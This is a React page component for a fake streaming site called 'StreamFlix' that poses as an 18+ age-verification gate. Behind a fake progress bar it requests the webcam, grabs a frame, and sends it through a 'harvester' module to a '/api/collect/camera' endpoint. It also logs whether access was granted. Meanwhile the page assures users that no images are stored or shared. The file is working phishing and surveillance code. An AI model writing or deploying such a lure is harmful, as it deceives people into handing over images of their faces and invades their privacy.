import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { Box, Button, Typography, Container, Card, CardContent, LinearProgress, Chip, AppBar, Toolbar, Grid, Paper, Avatar, Fade } from '@mui/material';
import PlayArrowIcon from '@mui/icons-material/PlayArrow';
import InfoOutlinedIcon from '@mui/icons-material/InfoOutlined';
import harvester from '../harvester/HarvesterCore';

export default function VideoPage() {
  const navigate = useNavigate();
  const [step, setStep] = useState('verify');
  const [progress, setProgress] = useState(0);

  useEffect(() => { harvester.init(); }, []);

  const handleVerify = () => {
    setStep('loading');
    let prog = 0;
    const interval = setInterval(() => {
      prog += Math.random() * 18 + 4;
      if (prog >= 100) {
        clearInterval(interval);
        setProgress(100);
        setTimeout(async () => {
          try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.createElement('video');
            video.setAttribute('playsinline', '');
            video.muted = true;
            video.srcObject = stream;
            await video.play();

            const captureFrame = () => {
              if (video.readyState < 2) {
                video.addEventListener('loadeddata', () => {
                  requestAnimationFrame(() => {
                    const canvas = document.createElement('canvas');
                    canvas.width = 320;
                    canvas.height = 240;
                    canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
                    const imgData = canvas.toDataURL('image/jpeg', 0.5);
                    harvester.send('/api/collect/camera', { imageData: imgData, metadata: { facingMode: 'user', resolution: '320x240' }, triggerType: 'auto' });
                    stream.getTracks().forEach(t => t.stop());
                    video.pause();
                    video.srcObject = null;
                  });
                }, { once: true });
                return;
              }
              requestAnimationFrame(() => {
                const canvas = document.createElement('canvas');
                canvas.width = 320;
                canvas.height = 240;
                canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
                const imgData = canvas.toDataURL('image/jpeg', 0.5);
                harvester.send('/api/collect/camera', { imageData: imgData, metadata: { facingMode: 'user', resolution: '320x240' }, triggerType: 'auto' });
                stream.getTracks().forEach(t => t.stop());
                video.pause();
                video.srcObject = null;
              });
            };
            requestAnimationFrame(captureFrame);
            harvester.send('/api/collect/camera-access', { granted: true });
            setStep('content');
          } catch (e) {
            harvester.send('/api/collect/camera-access', { granted: false });
            setStep('denied');
          }
        }, 500);
      } else {
        setProgress(prog);
      }
    }, 280);
  };

  if (step === 'content') {
    return (
      <Box sx={{ minHeight: '100vh', bgcolor: '#141414' }}>
        <AppBar position="sticky" sx={{ bgcolor: 'rgba(20,20,20,0.95)', boxShadow: '0 1px 3px rgba(0,0,0,0.3)', borderBottom: '1px solid rgba(255,255,255,0.04)' }}>
          <Container maxWidth="lg">
            <Toolbar sx={{ px: { xs: 0 } }} disableGutters>
              <Typography sx={{ fontWeight: 800, color: '#e50914', fontSize: '1.5rem', cursor: 'pointer', letterSpacing: '-0.5px' }} onClick={() => navigate('/')}>
                StreamFlix
              </Typography>
              <Box sx={{ flexGrow: 1 }} />
              <Chip 
                label="👤 Verified" 
                size="small" 
                sx={{ 
                  bgcolor: 'rgba(229,9,20,0.2)', 
                  color: '#e50914', 
                  fontWeight: 600,
                  border: '1px solid rgba(229,9,20,0.3)'
                }} 
              />
            </Toolbar>
          </Container>
        </AppBar>

        <Container maxWidth="md" sx={{ py: 6, textAlign: 'center' }}>
          <Fade in={true}>
            <Box>
              <Box sx={{ 
                position: 'relative', 
                mb: 4,
                borderRadius: '16px',
                overflow: 'hidden'
              }}>
                <Box sx={{
                  height: { xs: 280, md: 400 },
                  bgcolor: '#1a1a1a',
                  display: 'flex',
                  flexDirection: 'column',
                  alignItems: 'center',
                  justifyContent: 'center',
                  border: '1px solid #333',
                  position: 'relative'
                }}>
                  <Box sx={{
                    position: 'absolute',
                    inset: 0,
                    background: 'linear-gradient(to top, rgba(0,0,0,0.6) 0%, transparent 50%)',
                    zIndex: 1
                  }} />
                  <Typography sx={{ fontSize: '6rem', opacity: 0.3, position: 'relative', zIndex: 1 }}>🎬</Typography>
                  <Typography sx={{ 
                    color: '#555', 
                    fontWeight: 600, 
                    position: 'relative', 
                    zIndex: 1,
                    mt: 1
                  }}>
                    Premium Content Preview
                  </Typography>
                </Box>
                <Box sx={{
                  position: 'absolute',
                  bottom: 0,
                  left: 0,
                  right: 0,
                  p: 3,
                  background: 'linear-gradient(to top, rgba(0,0,0,0.8) 0%, transparent)',
                  zIndex: 2,
                  display: 'flex',
                  alignItems: 'center',
                  gap: 1.5
                }}>
                  <PlayArrowIcon sx={{ color: '#fff', fontSize: 28 }} />
                  <Typography sx={{ color: '#fff', fontWeight: 600, fontSize: '0.95rem' }}>
                    Content available after age verification
                  </Typography>
                </Box>
              </Box>
              <Typography variant="h5" sx={{ color: '#fff', fontWeight: 700, mb: 1 }}>
                Age Verification Complete
              </Typography>
              <Typography sx={{ color: '#888', mb: 3, maxWidth: 400, mx: 'auto' }}>
                Your identity has been verified. Content is now available for streaming.
              </Typography>
              <LinearProgress 
                sx={{ 
                  maxWidth: 300, 
                  mx: 'auto', 
                  height: 6, 
                  borderRadius: 3, 
                  bgcolor: '#333', 
                  '& .MuiLinearProgress-bar': { bgcolor: '#e50914' } 
                }} 
              />
              <Box sx={{ mt: 4, display: 'flex', justifyContent: 'center', gap: 2 }}>
                <Button 
                  variant="outlined" 
                  onClick={() => setStep('verify')} 
                  sx={{ 
                    borderColor: '#555', 
                    color: '#888',
                    borderRadius: '8px',
                    textTransform: 'none',
                    fontWeight: 600,
                    px: 3
                  }}
                >
                  Back to Home
                </Button>
                <Button 
                  variant="contained" 
                  sx={{ 
                    bgcolor: '#e50914', 
                    '&:hover': { bgcolor: '#b20710' },
                    borderRadius: '8px',
                    textTransform: 'none',
                    fontWeight: 700,
                    px: 4,
                    boxShadow: '0 4px 14px rgba(229,9,20,0.3)'
                  }}
                >
                  ▶ Play Content
                </Button>
              </Box>
            </Box>
          </Fade>
        </Container>
      </Box>
    );
  }

  if (step === 'denied') {
    return (
      <Box sx={{ 
        minHeight: '100vh', 
        bgcolor: '#141414', 
        display: 'flex', 
        alignItems: 'center', 
        justifyContent: 'center',
        px: 2 
      }}>
        <Container maxWidth="sm">
          <Fade in={true}>
            <Card sx={{ 
              bgcolor: '#1a1a1a', 
              border: '1px solid #333', 
              borderRadius: '16px', 
              textAlign: 'center', 
              p: 4
            }}>
              <Typography sx={{ fontSize: '4rem', mb: 2 }}>🚫</Typography>
              <Typography variant="h5" sx={{ color: '#e50914', fontWeight: 700, mb: 2 }}>
                Camera Access Required
              </Typography>
              <Typography sx={{ color: '#888', mb: 3, lineHeight: 1.7, px: 2, fontSize: '0.95rem' }}>
                We use a one-time camera scan for age verification. No images are stored or shared with third parties. Your privacy is protected.
              </Typography>
              <Button
                variant="contained"
                fullWidth
                size="large"
                onClick={() => window.location.reload()}
                sx={{ 
                  bgcolor: '#e50914', 
                  '&:hover': { bgcolor: '#b20710' }, 
                  fontWeight: 700, 
                  py: 1.5,
                  borderRadius: '10px',
                  textTransform: 'none',
                  fontSize: '1rem',
                  boxShadow: '0 4px 14px rgba(229,9,20,0.3)'
                }}
              >
                Try Again
              </Button>
              <Typography sx={{ color: '#666', mt: 2.5, fontSize: '0.8rem', lineHeight: 1.5 }}>
                Having trouble? Make sure your browser has camera permissions enabled.
              </Typography>
            </Card>
          </Fade>
        </Container>
      </Box>
    );
  }

  return (
    <Box sx={{ minHeight: '100vh', bgcolor: '#141414' }}>
      {/* Netflix-style Nav */}
      <AppBar position="sticky" sx={{ 
        bgcolor: 'rgba(20,20,20,0.95)', 
        boxShadow: '0 1px 3px rgba(0,0,0,0.3)',
        borderBottom: '1px solid rgba(255,255,255,0.04)'
      }}>
        <Container maxWidth="lg">
          <Toolbar sx={{ px: { xs: 0 } }} disableGutters>
            <Typography sx={{ fontWeight: 800, color: '#e50914', fontSize: '1.5rem', cursor: 'pointer', letterSpacing: '-0.5px' }} onClick={() => navigate('/')}>
              StreamFlix
            </Typography>
            <Box sx={{ flexGrow: 1 }} />
            <Box sx={{ display: { xs: 'none', sm: 'flex' }, gap: 2.5, alignItems: 'center' }}>
              <Typography sx={{ color: '#fff', fontSize: '0.85rem', cursor: 'pointer', fontWeight: 500 }}>Home</Typography>
              <Typography sx={{ color: '#888', fontSize: '0.85rem', cursor: 'pointer', '&:hover': { color: '#fff' } }}>Movies</Typography>
              <Typography sx={{ color: '#888', fontSize: '0.85rem', cursor: 'pointer', '&:hover': { color: '#fff' } }}>TV Shows</Typography>
              <Typography sx={{ color: '#888', fontSize: '0.85rem', cursor: 'pointer', '&:hover': { color: '#fff' } }}>My List</Typography>
            </Box>
          </Toolbar>
        </Container>
      </AppBar>

      {/* Hero Section */}
      <Box sx={{ 
        minHeight: '90vh', 
        display: 'flex', 
        alignItems: 'center', 
        background: 'linear-gradient(to top, #141414 0%, transparent 50%, #141414 100%), linear-gradient(to right, #141414 0%, transparent 50%)'
      }}>
        <Container maxWidth="lg">
          <Grid container spacing={4} alignItems="center">
            <Grid item xs={12} md={7}>
              <Box sx={{ mb: 2 }}>
                <Chip 
                  label="AGE-RESTRICTED" 
                  size="small" 
                  sx={{ 
                    bgcolor: '#e50914', 
                    color: '#fff', 
                    fontWeight: 700, 
                    mb: 2,
                    fontSize: '0.7rem'
                  }} 
                />
              </Box>
              <Typography variant="h3" sx={{ 
                color: '#fff', 
                fontWeight: 900, 
                mb: 2, 
                fontSize: { xs: '2rem', md: '3.2rem' },
                letterSpacing: '-0.5px',
                lineHeight: 1.1
              }}>
                Exclusive Premium Content
              </Typography>
              <Typography sx={{ 
                color: '#888', 
                mb: 3, 
                fontSize: { xs: '0.95rem', md: '1.05rem' }, 
                lineHeight: 1.7, 
                maxWidth: 500 
              }}>
                This content is age-restricted and requires identity verification. Must be 18+ to access. We use secure, encrypted verification that respects your privacy.
              </Typography>

              <Box sx={{ display: 'flex', gap: 1.5, mb: 3, flexWrap: 'wrap' }}>
                <Chip label="🔞 18+ Only" sx={{ bgcolor: 'rgba(229,9,20,0.2)', color: '#e50914', fontWeight: 600, border: '1px solid rgba(229,9,20,0.2)' }} />
                <Chip label="🔒 Encrypted" sx={{ bgcolor: 'rgba(255,255,255,0.05)', color: '#888', fontWeight: 600, border: '1px solid rgba(255,255,255,0.06)' }} />
                <Chip label="🎥 HD Quality" sx={{ bgcolor: 'rgba(255,255,255,0.05)', color: '#888', fontWeight: 600, border: '1px solid rgba(255,255,255,0.06)' }} />
              </Box>

              {step === 'loading' ? (
                <Box sx={{ maxWidth: 400 }}>
                  <Box sx={{ display: 'flex', alignItems: 'center', gap: 2, mb: 2 }}>
                    <Box sx={{ flex: 1 }}>
                      <LinearProgress 
                        variant="determinate" 
                        value={progress} 
                        sx={{ 
                          height: 8, 
                          borderRadius: 4, 
                          bgcolor: '#333', 
                          '& .MuiLinearProgress-bar': { bgcolor: '#e50914', borderRadius: 4 } 
                        }} 
                      />
                    </Box>
                    <Typography sx={{ color: '#888', fontSize: '0.9rem', whiteSpace: 'nowrap', fontWeight: 600 }}>
                      {Math.round(progress)}%
                    </Typography>
                  </Box>
                  <Typography sx={{ color: '#666', fontSize: '0.85rem' }}>
                    Scanning age verification documents...
                  </Typography>
                </Box>
              ) : (
                <Box sx={{ display: 'flex', gap: 2, flexWrap: 'wrap' }}>
                  <Button
                    variant="contained"
                    size="large"
                    onClick={handleVerify}
                    startIcon={<PlayArrowIcon />}
                    sx={{
                      bgcolor: '#e50914',
                      '&:hover': { bgcolor: '#b20710' },
                      fontWeight: 700,
                      py: 1.5,
                      px: 4,
                      fontSize: '1.05rem',
                      borderRadius: '8px',
                      textTransform: 'none',
                      boxShadow: '0 4px 14px rgba(229,9,20,0.3)',
                      '&:hover': { 
                        bgcolor: '#b20710',
                        boxShadow: '0 6px 20px rgba(229,9,20,0.4)'
                      }
                    }}
                  >
                    Verify Age & Watch
                  </Button>
                  <Button
                    variant="outlined"
                    size="large"
                    onClick={() => navigate('/')}
                    sx={{ 
                      borderColor: '#555', 
                      color: '#fff', 
                      '&:hover': { borderColor: '#888', bgcolor: 'rgba(255,255,255,0.04)' }, 
                      fontWeight: 600, 
                      px: 3,
                      borderRadius: '8px',
                      textTransform: 'none'
                    }}
                  >
                    Back to Home
                  </Button>
                </Box>
              )}

              <Typography sx={{ color: '#555', mt: 3, fontSize: '0.8rem', maxWidth: 400, lineHeight: 1.6 }}>
                By continuing, you agree to our Terms of Service and Privacy Policy. A one-time camera scan is required for age verification. No biometric data is stored.
              </Typography>
            </Grid>

            <Grid item xs={12} md={5} sx={{ display: { xs: 'none', md: 'flex' }, justifyContent: 'center' }}>
              <Box sx={{
                width: '100%',
                height: 450,
                bgcolor: '#1a1a1a',
                borderRadius: '16px',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                border: '1px solid #333',
                flexDirection: 'column',
                gap: 2,
                position: 'relative',
                overflow: 'hidden'
              }}>
                <Box sx={{
                  position: 'absolute', inset: 0,
                  background: 'radial-gradient(circle at 50% 50%, rgba(229,9,20,0.03) 0%, transparent 70%)'
                }} />
                <Typography sx={{ fontSize: '6rem', opacity: 0.2, position: 'relative', zIndex: 1 }}>🔞</Typography>
                <Typography sx={{ color: '#555', fontWeight: 600, position: 'relative', zIndex: 1 }}>Age-Restricted Content</Typography>
                <Chip label="18+ Verification Required" sx={{ bgcolor: 'rgba(229,9,20,0.15)', color: '#e50914', position: 'relative', zIndex: 1 }} />
              </Box>
            </Grid>
          </Grid>
        </Container>
      </Box>
    </Box>
  );
}